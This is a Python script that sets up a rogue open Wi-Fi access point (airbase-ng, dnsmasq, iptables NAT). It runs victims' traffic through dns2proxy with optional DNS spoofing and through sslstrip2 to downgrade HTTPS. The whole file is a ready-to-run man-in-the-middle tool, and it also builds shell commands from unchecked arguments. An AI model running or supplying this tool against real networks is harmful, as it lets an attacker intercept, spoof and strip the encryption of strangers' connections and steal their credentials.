#!/usr/bin/python3.5
import os
import sys
import argparse
import time


# install packages
def install_package():
    update = input("Install packages? Y/n: ")
    update = update.lower()

    if update == "y":
        os.system("sudo apt-get update")
        os.system("sudo apt-get install wireless-tools -y")
        os.system("sudo apt-get install dsniff -y")
        os.system("sudo apt-get install dnsmasq -y")
        os.system("sudo apt-get install screen -y")

        os.system("sudo apt-get install python-pip -y")
        os.system("sudo python -m pip install dnspython")
        os.system("sudo python -m pip install pcapy")

        print("\nDone!")

    exit()


if len(sys.argv) > 1 and (sys.argv[1] == "-i" or sys.argv[1] == "--install"):
    install_package()
# parse arguments
parser = argparse.ArgumentParser()
parser.add_argument("-i", "--install", action="store_true", help="install packages")
parser.add_argument("-ap", "--access-point", required=True, metavar="wlan0", help="access point interface")
parser.add_argument("-ni", "--network-interface", required=True, metavar="eth0", help="network interface")
parser.add_argument("-e", "--ssid", required=True, metavar="FREE_WIFI", help="SSID network")
parser.add_argument("-ch", "--chanel", required=True, metavar="1", help="channel for the AP")
parser.add_argument("-ss", "--ssl-strip", action="store_true", help="Use sslstrip2")
parser.add_argument("-ds", "--dns-spoof", action="store_true", help="Use DNS spoofing(config/dns_spoof)")

args = parser.parse_args()

# install packages
if args.install:
    install_package()

# check interfaces
if os.system("grep " + args.access_point + " /proc/net/dev >/dev/null 2>&1") != 0:
    print("No interface: " + args.access_point)
    exit()

if os.system("grep " + args.network_interface + " /proc/net/dev >/dev/null 2>&1") != 0:
    print("No interface: " + args.network_interface)
    exit()

# set environment
script_path = os.path.dirname(os.path.realpath(__file__))
script_path = script_path + "/"

# set wireless adapter to monitor mode
if os.system("sudo ifconfig " + args.access_point + " down >/dev/null 2>&1") != 0 \
        or os.system("sudo iwconfig " + args.access_point + " mode monitor >/dev/null 2>&1") != 0 \
        or os.system("sudo ifconfig " + args.access_point + " up >/dev/null 2>&1") != 0:
    print("Could not set " + args.access_point)
    exit()

# enable forwarding
os.system("sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1")

# start AP
os.system("sudo screen -S airbase-ng -m -d airbase-ng -e " + args.ssid + " -c " + args.chanel + " " + args.access_point)

# wait at0
i = 0
while os.system("grep at0 /proc/net/dev >/dev/null 2>&1") != 0:
    time.sleep(1)
    if i > 5:
        # kill screen
        os.system("sudo screen -S airbase-ng -X stuff '^C\n'")

        print("Could not find at0 interface created by airbase")
        exit()

    i += 1

# up network
os.system("sudo ifconfig at0 up")
os.system("sudo ifconfig at0 172.16.0.1 netmask  255.255.255.0")

# start dhcp
os.system("sudo /etc/init.d/dnsmasq stop > /dev/null 2>&1")
os.system("sudo pkill dnsmasq")
os.system("sudo dnsmasq -C " + script_path + "config/dnsmasq.conf > /dev/null 2>&1")

# set iptables
os.system("sudo iptables --flush")
os.system("sudo iptables --table nat --flush")
os.system("sudo iptables --delete-chain")
os.system("sudo iptables --table nat --delete-chain")
os.system("sudo iptables -P FORWARD ACCEPT")
os.system("sudo iptables --table nat --append POSTROUTING --out-interface " + args.network_interface + " -j MASQUERADE")
os.system("sudo iptables --append FORWARD -j ACCEPT --in-interface at0")

# if want use isc-dhcp-server
# os.system("sudo screen -S isc-dhcp-server -m -d dhcpd -cf " + script_path + "config/isc-dhcp-server.conf")

# enable dns2roxy
os.system("sudo iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-port 53")

if args.dns_spoof:
    os.system("sudo cp " + script_path + "config/dns_spoof " + script_path + "src/dns2proxy/spoof.cfg")
else:
    os.system("sudo echo '' > " + script_path + "src/dns2proxy/spoof.cfg")

os.system("sudo screen -S dns2roxy -m -d sh -c 'cd " + script_path + "src/dns2proxy && python dns2proxy.py'")

# enable sslstip2
if args.ssl_strip:
    os.system("sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 12000")
    os.system(
        "sudo screen -S sslstrip -m -d sh -c 'cd " + script_path + "src/sslstrip2 && python sslstrip.py -l 12000'")

# wait loop
print("Working!")
print("Use 'screen -r airbase-ng' for airbase-ng log")
print("Use 'screen -r dns2roxy' for dns2roxy log")
if args.ssl_strip:
    print("Use 'screen -r sslstrip' for sslstrip log")

while True:
    try:
        time.sleep(1)
    except KeyboardInterrupt:
        break

# clean
os.system("sudo iptables --flush")
os.system("sudo iptables --table nat --flush")
os.system("sudo iptables --delete-chain")
os.system("sudo iptables --table nat --delete-chain")

# kill process
os.system("sudo screen -S airbase-ng -X stuff '^C\n'")
os.system("sudo screen -S dns2roxy -X stuff '^C\n'")
if args.ssl_strip:
    os.system("sudo screen -S sslstrip -X stuff '^C\n'")
